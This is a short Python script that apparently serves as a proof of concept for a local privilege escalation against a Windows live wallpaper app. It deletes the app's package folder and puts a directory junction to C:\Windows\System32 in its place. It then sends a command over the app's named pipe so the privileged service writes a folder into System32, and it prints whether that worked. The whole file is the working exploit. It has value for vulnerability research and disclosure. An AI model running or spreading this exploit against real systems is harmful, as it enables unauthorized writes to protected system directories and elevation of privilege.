import os
import shutil

import time
import getpass


def stringToWstring(st : str) -> str:
    '''
    convert ascii string to unicode string

    argument :
        st : ascii
    
    return :
        ascii to unicode
    '''

    result = ''
    for i in st:
        result += i+'\x00'
    return result


def main():
    # current user name
    username = getpass.getuser()

    # path settings
    path1 = f'C:\\Users\\{username}\\AppData\\Local\\Packages\\Sidia.LiveWallpaper_wkpx6gdq8qyz8'
    path2 = 'C:\\Windows\\System32'

    # delete directory
    if os.path.isdir(path1):
        shutil.rmtree(path1)

    # create directory junction
    command = f'CreateMountPoint.exe "{path1}" "{path2}"'
    os.system(command)

    # named pipe connect and write
    with open('\\\\.\\pipe\\LiveWallpaperPipe', 'a') as f:
        f.write(stringToWstring('33;'))

    # IPC delay time
    time.sleep(2)

    # directory check
    if os.path.isdir(path2+'\\LiveWallpaperData'):
        print('[+] Success')
    else:
        print('[-] failed')

    # delete directory junction
    command = f'DeleteMountPoint.exe {path1}'
    os.system(command)
    shutil.rmtree(path1)


if __name__=='__main__':
    main()